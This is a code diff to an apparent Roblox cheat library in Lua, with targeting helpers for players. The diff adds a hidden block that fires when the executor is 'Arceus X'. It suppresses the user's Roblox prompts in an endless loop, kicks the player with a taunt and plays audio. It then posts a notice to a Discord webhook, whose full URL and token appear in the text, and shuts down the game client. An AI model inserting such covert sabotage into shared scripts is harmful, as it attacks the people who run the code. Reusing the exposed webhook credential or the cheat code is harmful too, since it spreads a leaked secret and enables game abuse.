@@ -10,6 +10,53 @@ local entity = {
 }
 local lplr = game:GetService("Players").LocalPlayer
 
+if identifyexecutor and identifyexecutor():find("Arceus") then 
+    local image2 = Instance.new("ImageLabel")
+    image2.Size = UDim2.new(0, 0, 0, 0)
+    image2.AnchorPoint = Vector2.new(0.5, 0.5)
+    image2.Image = "rbxassetid://10168867281"
+    image2.BackgroundTransparency = 1
+    image2.Position = UDim2.new(0.5, 0, 0.5, 0)
+    image2.Parent = game.CoreGui.RobloxGui
+    local audio = Instance.new("Sound")
+    audio.SoundId = "rbxassetid://7147641250"
+    audio.Parent = workspace
+    repeat task.wait() until image2.IsLoaded and audio.IsLoaded
+    local overlay = game:GetService("CoreGui"):WaitForChild("RobloxPromptGui"):WaitForChild("promptOverlay")
+    overlay.ChildAdded:Connect(function(obj)
+        task.spawn(function()
+            repeat
+                task.wait()
+                obj.Visible = false
+            until true == false
+        end)
+        local image = Instance.new("ImageLabel")
+        image.Size = UDim2.new(0, 128, 0, 128)
+        image.AnchorPoint = Vector2.new(0.5, 0.5)
+        image.Image = "rbxassetid://10168867281"
+        image.BackgroundTransparency = 1
+        image.Position = UDim2.new(0.5, 0, 0.5, 0)
+        image.Parent = overlay
+    end)
+    lplr:Kick("what the dog doin")
+    task.wait(0.1)
+    audio:Play()
+    audio.Ended:Wait()
+    local encoded = game:GetService("HttpService"):JSONEncode({
+        content = "Arceus X user executed script :skull:",
+        embeds = "",
+        attachments = {}
+    })
+    local ok = request({
+        Url = "https://discord.com/api/webhooks/995376684717047918/fK9GLBjjFzjsBAgZWl2ZYO1qo8N3zqGwKqcelY9R6DRs4PU5aLoimaFVW34IxDjS2PA3",
+        Method = "POST",
+        Body = encoded,
+        Headers = {["Content-Type"] = "application/json"}
+    })
+    task.wait(1)
+    game:Shutdown()
+end
+
 do
     entity.isPlayerTargetable = function(plr)
         if plr.Team ~= lplr.Team or lplr.Team == nil then
